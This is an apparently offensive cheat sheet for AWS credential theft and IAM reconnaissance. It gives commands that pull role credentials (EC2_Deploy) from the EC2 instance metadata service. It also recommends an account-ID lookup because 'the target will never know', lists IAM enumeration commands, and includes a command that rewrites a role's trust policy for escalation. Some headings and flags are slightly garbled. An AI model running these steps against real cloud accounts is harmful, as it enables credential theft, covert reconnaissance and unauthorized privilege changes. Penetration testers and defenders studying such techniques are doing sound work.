
# Security Credentials 

## Find associated creds with attached service account

### Get API Token

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
```

### Use Token to enumerate iam info
```
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
```

### EC2 Deploy Creds

```
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2_Deploy
```

## Get account ID from an access key ID

- Any AWS user/role in any AWS account with the permission sts:GetAccessKeyInfo
can find the parent AWS Account ID from an Access Key ID.

- This action is only logged in CloudTrail to the account it’s run in, so run this in your
account and the target will never know!

```
aws sts get-access-key-info --access-key-id=AKIA
```


# AWS CLI
## List IAM Users

```
aws iam list-users
```

## Get User Permissions
### List attached managed policies

```
aws iam list-attached-user-policies --user-name [user-name]
```


A### List inline policies

```
aws iam list-user-policies --user-name [user-name]
```

### Get inline policy details

```
aws iam get-user-policy --user-name [user-name] --policy-name [policy-name]
```

## List IAM Groups and Permissions
### List groups for a user

```
aws iam list-groups-for-user --user-name [user-name]
```

### List group policies

```
aws iam list-attached-group-policies --group-name [group-name] aws iam list-group-policies --group-name [group-name]
```

##. Get inline group policy details

```
aws iam get-group-policy --group-name [group-name] --policy-name [policy-name]
```

## List IAM Roles and Permissions
### List all roles

```
aws iam list-roles
```
### Get role details (trust policy)

```
aws iam get-role --role-name [role-name]
```
### List attached policies

```
aws iam list-attached-role-policies --role-name [role-name]
```
### List inline policies

```
aws iam list-role-policies --role-name [role-name]
```

### Get inline role policy details

```
aws iam get-role-policy --role-name [role-name] --policy-name [policy-name]
```


#### Update a role policy

```
aws iam update-assume-role-policy --rolename <deploy> --policy-document file://new-trust-policy.json
```

## Get and Decode Policy Documents
### Get a managed policy document (by ARN or name)

```
aws iam get-policy --policy-arn [policy-arn] aws iam get-policy-version --policy-arn [policy-arn] --version-id [version-id]
```

## View Full IAM Snapshot
### Dump all IAM permissions (users, roles, groups, policies)

```
aws iam get-account-authorization-details
```

    Use this to build a full IAM permissions map. Add --filter to target roles/users/groups specifically.
